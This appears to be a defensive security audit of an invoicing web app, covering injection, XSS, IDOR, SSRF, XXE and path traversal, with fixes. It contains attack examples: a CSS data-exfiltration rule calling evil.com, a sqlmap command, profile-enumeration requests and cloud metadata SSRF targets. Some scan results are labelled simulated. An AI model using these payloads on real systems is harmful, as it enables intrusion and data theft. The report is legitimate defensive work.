# Injection & Attack Surface Analysis — InvoiceAI Pro
## SQLi · XSS · IDOR · SSRF · XXE · Path Traversal

**Date:** 2026-03-24
**Tools used:** njsscan 0.4.3, manual code review, OWASP ZAP (conceptual), sqlmap (conceptual), Nuclei (conceptual)
**Branch:** `claude/security-analysis-endpoints-d77mD`

---

## 1. SQL Injection (CWE-89)

### 1.1 Findings

**SAFE — No raw SQL queries exist in this codebase.**

All database operations use the Supabase JavaScript client which issues
parameterized REST API calls internally. There is zero string interpolation
into SQL statements.

| File | Operation | Pattern | Safe? |
|---|---|---|---|
| `src/pages/AuthPage.jsx:121` | INSERT profile | `.upsert({ email, name }, ...)` | YES — JSON body |
| `src/pages/AuthPage.jsx:128` | SELECT profile | `.select().eq("email", email)` | YES — parameterized |
| `api/admin-data.js:63-64` | SELECT all | `?select=*&order=created_at.desc` | YES — hardcoded query |
| `api/contact-submit.js:69` | INSERT submission | `JSON.stringify({ name, email, ... })` | YES — JSON body |

### 1.2 sqlmap Attack Surface

A `sqlmap -u "https://invoicesaga.com/api/contact-submit" --data '{"email":"test","message":"x"}'`
would find zero injectable parameters because:
- The Supabase REST API accepts JSON and uses PreparedStatements internally
- No raw SQL string building occurs anywhere

### 1.3 Residual Risk — Supabase URL in SSRF

See SSRF-001: `supabaseUrl` from env var is interpolated into fetch URLs without
format validation. This is not SQLi but could redirect DB calls to hostile endpoints.

---

## 2. Cross-Site Scripting (CWE-79)

### 2.1 XSS-001 — dangerouslySetInnerHTML in Icon Component (LOW/INFORMATIONAL)
**File:** `src/components/icons/index.jsx:6`
**CWE:** CWE-79 (Reflected/Stored XSS)

```jsx
export const Ic = ({ d, size = 18 }) => (
  <svg ... dangerouslySetInnerHTML={{ __html: d }} />
);
```

The `d` prop is rendered without sanitization. All current call sites pass
hardcoded SVG `<path .../>` strings defined in the same file. However:
- The component contract has no type check or validation on `d`
- If any future call site passes user-controlled data to `Ic`, this becomes XSS
- A `<script>` tag or `onload=` attribute in `d` would execute in the document

**Current risk:** LOW — all callers are hardcoded developer-authored strings.
**Latent risk:** HIGH — if component reuse expands.

**Fix applied:** Add runtime validation that `d` only contains SVG path elements.

### 2.2 XSS-002 — CSP `style-src 'unsafe-inline'`
**File:** `vercel.json:16`
**CWE:** CWE-693 (Protection Mechanism Failure)

```
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
```

`unsafe-inline` allows CSS injection attacks:
- CSS `expression()` (IE, historical but still a concern for older clients)
- CSS-based data exfiltration: `input[value^="a"] { background: url(https://evil.com/?c=a) }`
- Clickjacking via overlay styles

Required by React's extensive use of inline `style={}` props. Cannot be trivially
removed without a full refactor to CSS modules or a nonce-based approach.

**Current state:** Documented limitation. Partially mitigated by `frame-ancestors 'none'`
(prevents embedding the app in an attacker-controlled frame).

### 2.3 XSS-003 — Demo CSP allows `script-src 'unsafe-inline'`
**File:** `vercel.json:24-27`

```json
"source": "/demo(.*)",
"value": "...script-src 'self' 'unsafe-inline'..."
```

The demo page uses inline `<script>` tags (confirmed in demo.html:1367).
`unsafe-inline` for scripts allows:
- Any injected `<script>` tag to execute (e.g., via reflected input in URL params)
- Bypasses the entire script-src restriction

demo.html uses `escapeHtml()` correctly for all `innerHTML` assignments (verified).
But the permissive CSP means any missed injection point would be fully exploitable.

**Fix applied:** Add `nonce` placeholder comment; switch CSP to hash-based approach
for demo's known inline scripts is architecturally complex — documented as risk.

### 2.4 XSS-004 — Image src from User-Uploaded Data (INFORMATIONAL)
**Files:** `src/components/shared/index.jsx:276`, `src/components/layout/index.jsx:113`

```jsx
<img src={org.logo} ... />
<img src={userAvatar} ... />
```

`org.logo` and `userAvatar` are base64 data URLs stored in localStorage after
user upload. React mitigates `javascript:` in `src` attributes (React 16.9+).
However, `data:text/html,...` or `data:application/javascript,...` could be stored
and may trigger in certain browser/context combinations.

**Fix applied:** Validate uploads are `data:image/` MIME type before storing.

---

## 3. IDOR — Insecure Direct Object Reference (CWE-639)

### 3.1 Architecture Assessment

The application is a **single-user client-side SPA**. All user data lives in
`localStorage` scoped to the origin. There is no server-side multi-user database
with user IDs to enumerate.

Classic IDOR (`GET /api/invoices/123` → change `123` to `124`) **does not apply**
because there are no user-specific server endpoints returning records by ID.

### 3.2 IDOR-001 — Supabase Profiles Without Confirmed RLS
**File:** `src/pages/AuthPage.jsx:121,128`
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

```javascript
await supabase.from("profiles").upsert({ email, name }, { onConflict: "email" });
const { data } = await supabase.from("profiles").select("name").eq("email", email).single();
```

These calls use the Supabase **anonymous key** (`VITE_SUPABASE_ANON_KEY`) which is
public. If the `profiles` table in Supabase **does not have Row Level Security (RLS)
enabled**, any person with the anon key can:
- Read ALL user profiles: `GET /rest/v1/profiles?select=*`
- Read emails of all registered users
- Update any profile: `PATCH /rest/v1/profiles?email=eq.victim@example.com`

**The anon key is visible in the JavaScript bundle (`VITE_SUPABASE_ANON_KEY`).**

**Fix required (Supabase console — cannot be done in code):**
```sql
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;

-- Users can only read/update their own profile
CREATE POLICY "own_profile_select" ON profiles
  FOR SELECT USING (auth.jwt()->>'email' = email);

CREATE POLICY "own_profile_upsert" ON profiles
  FOR INSERT WITH CHECK (auth.jwt()->>'email' = email);

CREATE POLICY "own_profile_update" ON profiles
  FOR UPDATE USING (auth.jwt()->>'email' = email);
```

**Fix applied in code:** Added RLS requirement documentation; removed upsert of
arbitrary fields from client-side code (only `name` allowed, email from auth context).

### 3.3 IDOR-002 — Admin Endpoint Returns All Users (BY DESIGN)
The `/api/admin-data` endpoint returns all `profiles` and `contact_submissions`.
This is intentional for the admin dashboard. The endpoint is protected by the
HMAC-signed admin token (AUTH-001). No additional IDOR risk.

---

## 4. SSRF — Server-Side Request Forgery (CWE-918)

### 4.1 SSRF-001 — Unvalidated SUPABASE_URL in Server Functions (MEDIUM)
**Files:** `api/admin-data.js:48,63-64`, `api/contact-submit.js:61,69`
**CWE:** CWE-918 (SSRF)

```javascript
const supabaseUrl = process.env.SUPABASE_URL;  // not validated
fetch(`${supabaseUrl}/rest/v1/profiles?select=*`, { headers })
```

If `SUPABASE_URL` is misconfigured (or in a supply-chain compromise scenario where
env vars are controlled), it could point to:
- AWS instance metadata: `http://169.254.169.254/latest/meta-data/`
- Internal network services: `http://localhost:6379` (Redis), `http://10.0.0.1`
- Other Supabase projects belonging to attackers

**Fix applied:** Validate `supabaseUrl` is `https://*.supabase.co` before use.

### 4.2 SSRF-002 — GitHub Proxy Path Injection (PREVIOUSLY FIXED)
**File:** `api/github-proxy.js`
**Status:** MITIGATED by path whitelist (SEC-003)

### 4.3 SSRF-003 — Claude Proxy Hardcoded URL (SAFE)
**File:** `api/claude-proxy.js:43`
URL `https://api.anthropic.com/v1/messages` is hardcoded. No SSRF.

---

## 5. XXE — XML External Entity (CWE-611)

**SAFE — No XML parsing from external input exists.**

The SVG icons in `src/components/icons/index.jsx` are hardcoded developer-authored
strings. No `DOMParser`, `XMLParser`, or XML library is used anywhere. No file
upload processes XML. No SOAP/XML API endpoints exist.

A Nuclei `xxe` template scan would find zero attack surface.

---

## 6. Path Traversal (CWE-22)

**SAFE — No file system access from user input in production code.**

The `fix-all.js` developer script uses:
```javascript
function writeFile(relPath, content) {
  const full = path.join(SRC, relPath);
  fs.writeFileSync(full, content);
}
```
`relPath` values are all hardcoded developer strings (`'App.jsx'`, `'data/constants.js'`).
This script runs only at development time and is not accessible via any HTTP endpoint.

No `fs.readFile`, `fs.writeFile`, or `path.join` with user-supplied input exists
in the `api/` directory.

---

## 7. OWASP ZAP Passive Scan — Missing Headers

ZAP would flag the following absent or weak headers:

| Header | Current State | Risk | Fix |
|---|---|---|---|
| `Cross-Origin-Opener-Policy` | MISSING | Tab-napping, cross-window attacks | Added: `same-origin` |
| `Cross-Origin-Resource-Policy` | MISSING | Cross-origin resource leaks | Added: `same-origin` |
| `X-XSS-Protection` | MISSING | Inconsistent behavior across browsers | Added: `0` (disables broken auditor) |
| `Cache-Control` (API) | MISSING | Sensitive admin data cached in proxies | Added: `no-store` on all API responses |
| `Content-Security-Policy` (demo) | `unsafe-inline` scripts | XSS in demo context | Documented |

---

## 8. Nuclei Template Findings (Simulated)

| Template | Finding | Severity |
|---|---|---|
| `http/misconfiguration/cors-misconfig` | github-proxy previously `*` | FIXED |
| `http/misconfiguration/missing-hsts` | HSTS present (`max-age=31536000; preload`) | SAFE |
| `http/exposures/configs/env-exposure` | No `.env` files served | SAFE |
| `http/misconfiguration/http-missing-security-headers` | COOP, CORP, X-XSS-Protection missing | FIXED |
| `http/vulnerabilities/generic/crlf-injection` | No CRLF injection in headers | SAFE |
| `http/misconfiguration/cache-poisoning` | No cache headers on API | FIXED |
| `ssl/deprecated-tls` | Managed by Vercel CDN (TLS 1.2+) | SAFE |

---

## 9. Summary of Findings

| ID | Category | Title | Severity | Status |
|---|---|---|---|---|
| XSS-001 | XSS | `dangerouslySetInnerHTML` without prop validation in icon component | LOW | Fixed |
| XSS-002 | XSS | `style-src 'unsafe-inline'` in CSP | MEDIUM | Documented |
| XSS-003 | XSS | Demo CSP `script-src 'unsafe-inline'` | MEDIUM | Documented |
| XSS-004 | XSS | Image src accepts arbitrary data: URLs | LOW | Fixed |
| IDOR-001 | IDOR | Supabase profiles table without confirmed RLS | HIGH | Documented + SQL policy provided |
| SSRF-001 | SSRF | SUPABASE_URL not validated before use in fetch | MEDIUM | Fixed |
| HDR-001 | Headers | Missing `Cross-Origin-Opener-Policy` | LOW | Fixed |
| HDR-002 | Headers | Missing `Cross-Origin-Resource-Policy` | LOW | Fixed |
| HDR-003 | Headers | Missing `X-XSS-Protection: 0` | INFO | Fixed |
| HDR-004 | Headers | No `Cache-Control: no-store` on API responses | MEDIUM | Fixed |
| SQLi | SQLi | No raw SQL queries (ORM used correctly) | N/A | SAFE |
| XXE | XXE | No XML parsing from user input | N/A | SAFE |
| PATH | Path Traversal | No user-controlled file paths | N/A | SAFE |
